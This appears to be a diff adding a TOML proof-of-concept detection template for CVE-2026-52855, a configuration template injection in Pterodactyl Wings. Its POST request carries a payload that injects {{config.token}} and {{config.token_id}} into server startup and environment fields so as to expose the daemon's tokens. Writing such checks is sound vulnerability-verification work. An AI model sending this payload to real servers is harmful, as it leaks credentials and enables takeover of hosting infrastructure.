@@ -1,0 +1,72 @@
+[info]
+author = "ave"
+description = "PoC/EXP for verification"
+id = "POC-AVE-2026-0760"
+name = "CVE-2026-52855 Pterodactyl Wings 配置模板注入检测 PoC"
+severity = "critical"
+tags = ["ave-2026-0760"]
+vuln_id = [
+    "CVE-2026-52855",
+    "AVE-2026-0760",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/system"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "version",
+    "token_id",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/servers"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"startup": "{{config.token}} {{config.token_id}}", "environment": {"PLACEHOLDER": "{{config.token}}"}}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "config.token",
+    "config.token_id",
+    "registries",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/servers/00000000-0000-0000-0000-000000000000/files/contents"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "config.token",
+    "config.token_id",
+    "registries",
+]
